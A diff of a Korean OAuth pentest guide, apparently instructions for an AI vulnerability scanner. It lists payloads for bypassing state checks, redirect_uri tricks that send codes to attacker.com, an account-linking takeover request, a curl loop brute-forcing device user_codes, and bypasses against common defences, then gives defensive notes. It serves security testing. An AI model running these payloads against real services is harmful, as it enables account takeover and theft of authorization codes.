@@ -1,87 +1,131 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-#### 2단계 동적 테스트 프로세스
-
-OAuth 취약점(특히 state 검증 우회)의 동적 테스트는 **2단계**로 나누어 수행한다. 1단계에서 검증 로직의 우회만 확인한 뒤 바로 "확인됨"으로 보고하지 않고, 반드시 2단계에서 유효한 인가 코드를 사용하여 전체 공격 체인을 검증해야 한다.
-
-**1단계: 검증 로직 우회 확인 (임의 코드 사용)**
-
-소스코드에서 식별한 우회 벡터가 실제로 서버에서 동작하는지 빠르게 확인한다. 이 단계에서는 유효하지 않은 임의 코드(`testcode` 등)를 사용하여 **검증 로직 자체의 우회 여부**만 확인한다.
-
+**state 검증** (`STATE_MISSING`/`STATE_WEAK_STORAGE` 라벨):
 ```
-# state 검증 우회 테스트 (비교용: 잘못된 state → 거부 확인)
-curl "https://target.com/auth/callback?code=testcode&state=wrongstate" -b "SESSION" -H "Accept: application/json"
-# → 400 거부 응답이면 state 검증이 동작하는 것
+# baseline (잘못된 state → 거부 확인)
+GET /auth/callback?code=test&state=wrongstate  Cookie: SESSION
 
-# state 검증 우회 테스트 (빈 state, state 제거 등 우회 벡터)
-curl "https://target.com/auth/callback?code=testcode&state=" -b "SESSION" -H "Accept: application/json"
-# → 400이 아닌 다른 응답(에러 포함)이면 state 검증이 우회된 것
+# state 제거
+GET /auth/callback?code=test  Cookie: SESSION
 
-# 응답이 400 거부가 아니라 토큰 교환 에러(5xx, 유효하지 않은 코드 에러 등)라면,
-# state 검증은 우회되었으나 토큰 발급은 실패한 상태
+# state 빈 값
+GET /auth/callback?code=test&state=  Cookie: SESSION
+
+# 다른 사용자 state (세션 외 저장 시)
+GET /auth/callback?code=test&state=ATTACKER_STATE  Cookie: VICTIM_SESSION
 ```
 
-1단계에서 검증 우회가 확인되면 → **2단계로 진행**하여 유효한 코드로 전체 체인 검증
-1단계에서 우회가 확인되지 않으면 → 해당 벡터는 보고서에서 제외
-
-**2단계: 전체 공격 체인 검증 (유효한 인가 코드 사용)**
-
-1단계에서 검증 우회가 확인된 경우, 사용자에게 **유효한 OAuth 인가 코드**를 요청하여 전체 공격 체인(검증 우회 → 토큰 발급 → 세션/계정 탈취)을 검증한다.
-
-사용자에게 다음과 같이 요청한다:
-
-> state 검증 우회가 1단계에서 확인되었습니다. 전체 공격 체인을 검증하려면 유효한 OAuth 인가 코드가 필요합니다.
->
-> **인가 코드 획득 방법:**
-> 1. 브라우저에서 OAuth 인가 URL에 접속하여 로그인합니다
->    (예: `https://target.com/login/oauth`)
-> 2. 로그인 후 콜백 URL로 리다이렉트될 때, **URL의 `code=` 파라미터 값**을 복사합니다
->    (브라우저 주소창이나 네트워크 탭에서 확인 가능)
-> 3. 해당 코드를 여기에 붙여넣어 주세요
->
-> **주의:** 인가 코드는 일회용이며 수분 내 만료됩니다. 코드를 획득한 후 빠르게 제공해 주세요.
-> 유효한 코드를 제공하지 않으면, 1단계 결과만으로 "후보"로 보고합니다.
-
-유효한 코드를 받으면 즉시 다음 테스트를 수행한다:
-
+**1단계 검증 우회 확인 시 → 2단계 (유효 인가 코드 + 전체 체인 검증)** — 사용자에게 유효 코드 요청
 ```
-# 유효한 코드 + 우회 벡터로 전체 체인 테스트
-curl "https://target.com/auth/callback?code=USER_PROVIDED_VALID_CODE&state=" -b "SESSION" -v
-
-# 성공 시: 토큰 발급, 세션 생성, 리다이렉트 등이 발생
-# → "확인됨"으로 보고
-
-# 실패 시: 토큰 교환 에러, 인가 코드 만료 등
-# → "후보"로 보고하되 1단계 검증 결과는 포함
+GET /auth/callback?code=VALID_CODE&state=  Cookie: SESSION
+# 토큰 발급 + 세션 생성 시 확인됨
 ```
 
-**2단계 검증 결과 판정:**
-- 유효한 코드로 토큰 발급이 성공하고 세션이 생성됨 → **"확인됨"**
-- 유효한 코드를 사용했으나 다른 이유(서버 버그 등)로 실패 → **"후보"** (미확인 사유에 상세 기술)
-- 사용자가 유효한 코드를 제공하지 않음 → **"후보"** (1단계 검증 결과 포함, 미확인 사유: 유효한 인가 코드 미제공)
+**redirect_uri 우회** (`REDIRECT_URI_LOOSE` 라벨):
+- `https://allowed.com/callback/../../attacker` (path traversal)
+- `https://allowed.com/callback%2f..%2f..%2fattacker`
+- `https://attacker.allowed.com/callback` (서브도메인)
+- `https://allowed.com/callback?next=https://attacker.com` (open-redirect 결합)
+- `https://allowed.com/callback#@attacker.com` (fragment trick)
+- `https://allowed.com%40attacker.com` (URL 인코딩 + @)
+- `https://allowed.com\\@attacker.com` (백슬래시)
+- `https://allowed.com:80@attacker.com` (port + @)
 
-#### 기타 동적 테스트
-
-**redirect_uri 검증 우회 테스트 (OAuth 서버 구현 시):**
+**PKCE 미적용** (`PKCE_MISSING` 라벨):
 ```
-# 서브디렉토리 추가
-/auth/authorize?redirect_uri=https://allowed.com/callback/../attacker
-
-# 서브도메인 변형
-/auth/authorize?redirect_uri=https://attacker.allowed.com/callback
-
-# 쿼리 파라미터 추가
-/auth/authorize?redirect_uri=https://allowed.com/callback?next=https://attacker.com
-
-# URL 인코딩
-/auth/authorize?redirect_uri=https://allowed.com%40attacker.com
+# 모바일/SPA에서 code_challenge 누락
+GET /authorize?response_type=code&client_id=X&redirect_uri=...&scope=...
+# (code_challenge/code_challenge_method 없이 발급되면 PKCE 미강제)
 ```
 
-**토큰 노출 확인:**
-- OAuth 콜백 응답에서 토큰이 URL에 포함되는지 확인
-- `response_type=token`(Implicit Flow) 사용 여부 확인
+**id_token 검증** (`IDTOKEN_VALIDATION` 라벨):
+- jwt-scanner 결합 — alg none, RS256↔HS256 confusion, jku/jwk/kid 변조
 
-**검증 기준:**
-- **확인됨**: 동적 테스트 2단계에서 유효한 인가 코드를 사용하여 OAuth 흐름 조작을 통해 토큰 발급/세션 생성이 확인됨
-- **후보**: 1단계에서 검증 우회는 확인되었으나 2단계(유효한 코드로 전체 체인 검증)를 수행하지 못한 경우, 또는 동적 테스트를 수행하지 않은 경우
+**Account linking** (`ACCOUNT_TAKEOVER` 라벨):
+```
+# 1. attacker가 자체 발행 IdP에 victim@email로 계정 생성 (verified=false)
+# 2. account linking endpoint 호출
+POST /api/account/link  Authorization: Bearer ATTACKER_TOKEN
+{"provider":"custom_idp", "external_email":"victim@target.com"}
+# → victim 계정 연결 성공 시 takeover
+```
+
+**Implicit Flow** (`IMPLICIT` 라벨):
+```
+# response_type=token (deprecated)
+GET /authorize?response_type=token&client_id=X&redirect_uri=...
+# fragment에 access_token 노출 시 → IMPLICIT 잔존
+```
+
+**Mix-up attack (다중 IdP):**
+```
+# 다중 IdP 환경에서 IdP 응답을 다른 IdP로 속임
+GET /callback?code=...&iss=https://OTHER_IDP.com&state=...
+# iss 검증 누락 시 다른 IdP의 코드를 본 IdP 코드로 처리
+```
+
+**Authorization endpoint 파라미터 인젝션:**
+```
+# prompt=none + login_hint 인젝션
+GET /authorize?client_id=X&redirect_uri=...&prompt=none&login_hint=victim@x.com
+# 사용자 동의 화면 우회 시도
+```
+
+**Covert redirect (RFC 6749 §10.15):**
+```
+# 동의 후 redirect_uri fragment에 token 노출
+GET /authorize?response_type=token&client_id=X&redirect_uri=https://allowed.com/cb#evil
+```
+
+**Device Authorization Grant (RFC 8628) user_code brute force:**
+```
+# user_code가 짧고 추측 가능 시
+for code in $(seq 100000 999999); do
+  curl -X POST "https://target/oauth/device/verify" -d "user_code=$code"
+done
+```
+
+**Token introspection cache:**
+```
+# 폐기된 토큰이 cache로 유효 유지
+POST /token/revoke  ... (토큰 폐기)
+GET /api/x  Authorization: Bearer REVOKED_TOKEN  ← 여전히 200
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 페이로드 |
+|---|---|
+| `redirect_uri` prefix 매칭 | path traversal `/cb/../../evil`, `@`, `#`, `?` |
+| `state` 예측 가능 (timestamp/sequential) | 동일 값 예측 후 강제 |
+| `state` cookie 저장 | 공격자 cookie 주입 가능 시 양쪽 제어 |
+| PKCE S256 + 약한 verifier | `Math.random()` 같은 약한 난수 → brute force |
+| id_token `iss` 검증 + `aud` 누락 | 다른 client용 토큰 재사용 |
+| Account linking + 이메일 verified 체크 | 자체 발행 IdP의 verified flag 신뢰 불가 |
+| Persisted refresh token | rotation 없으면 탈취 후 영구 |
+| `redirect_uri` strict + `?` 누락 | query string 추가 (`?evil=1`)로 우회 |
+| Authorization request만 검증, token request 미검증 | 두 요청 모두 redirect_uri 검증 필수 |
+
+---
+
+**참고사항:**
+
+- state 검증은 1단계만으로 결정 금지 — 반드시 2단계 (유효 코드 + 전체 체인) 검증
+- 유효 인가 코드는 일회용/수분 만료 — 사용자에게 즉시 사용 안내
+- PKCE는 모바일/SPA에서 RFC 7636 권고 — public client는 필수
+- `redirect_uri`는 authorization request와 token request 양쪽에 검증 필수 (RFC 6749)
+- Account linking 시 IdP의 `email_verified` 플래그가 자체 발행이면 신뢰 불가
+- Mix-up attack은 다중 IdP 환경 — `iss` 검증으로 방어
+- FAPI (금융권) 환경은 PAR/JARM 같은 추가 강화 요구
+- DPoP token binding 적용 시 탈취 토큰 단독 사용 불가
+- Refresh token rotation 없으면 탈취 시 영구 — short TTL + rotation 권장
+- Implicit Flow는 OAuth 2.1에서 deprecated — Code Flow + PKCE 권장
+- Device Authorization Grant의 user_code는 짧으면 brute force 가능 — rate limit 필수
+- Token introspection 결과 cache는 짧은 TTL (10초 이하) 권장 — 폐기 즉시 반영
+- Authorization Server SSRF (`request_uri` parameter)는 별도 영역 — ssrf-scanner 결합
+- redirect_uri의 fragment(`#`)는 서버에 전송되지 않지만 클라이언트 후처리 시 영향
+- Confidential client (server-side)는 client_secret 노출 시 위험 — public client는 PKCE 대신
